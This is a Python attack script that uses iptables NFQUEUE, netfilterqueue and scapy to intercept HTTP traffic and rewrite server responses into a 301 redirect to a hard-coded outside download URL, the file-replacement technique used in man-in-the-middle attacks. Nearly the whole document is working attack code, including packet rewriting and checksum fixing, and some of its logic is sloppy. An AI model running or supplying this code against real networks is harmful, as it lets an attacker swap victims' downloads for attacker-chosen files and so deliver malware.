#!/usr/bin/env python

import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse

url = "http://dl3.downloadly.ir/Files/Elearning/Udemy_Learn_Photoshop_Web_Design_Profitable_Freelancing_2020-3.part4_Downloadly.ir.rar"


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", dest="file",
                        help="Please specify the file extension")
    options = parser.parse_args()
    return options


def iptables():
    subprocess.call(["iptables", "-I", "OUTPUT", "-j",
                     "NFQUEUE", '--queue-num', "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j",
                     "NFQUEUE", '--queue-num', "0"])


def iptables_ssl():
    subprocess.call(["iptables", "-t", "nat", "-A",
                     "PREROUTING", '-p', "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])


def iptables_flush():
    subprocess.call(["iptables", "--flush"])


ack_list = []


def process_packet(packet):
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.Raw):
        if http_packet.haslayer(scapy.TCP):
            options = get_argument()
            if http_packet[scapy.TCP].dport == 80:
                if options.file:
                    print(f"{options.file} Request...")
                    ack_list.append(http_packet[scapy.TCP].ack)
            elif http_packet[scapy.TCP].sport == 80:
                if http_packet[scapy.TCP].seq in ack_list:
                    http_packet[
                        scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {url}\n\n"
                    print(f"{options.file} Response...")
                    ack_list.remove(http_packet[scapy.TCP].seq)

                    del http_packet[scapy.IP].len
                    del http_packet[scapy.IP].chksum
                    del http_packet[scapy.TCP].chksum
                    packet.set_payload(bytes(http_packet))

    packet.accept()


try:
    iptables()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nFlushing ipatables...")
    iptables_flush()
